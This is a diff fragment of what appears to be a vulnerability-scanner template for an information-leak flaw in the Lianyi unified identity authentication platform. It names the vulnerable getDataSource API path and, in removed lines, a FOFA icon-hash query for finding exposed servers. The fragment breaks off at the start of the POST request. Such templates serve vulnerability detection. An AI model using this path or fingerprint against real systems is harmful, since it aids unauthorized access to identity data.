@@ -3,14 +3,8 @@ info:
   name: 联奕统一身份认证平台getDataSource存在信息泄露漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/4cf6cc9226cc06af51924ff6b475cba1
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,info-leak,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 4cf6cc9226cc06af51924ff6b475cba1
-    fofa: + fofa`icon_hash="772658742"`
 http:
 - raw:
   - 'POST /api/bd-mdp/serviceManager/outInterface/getDataSource HTTP/1.1
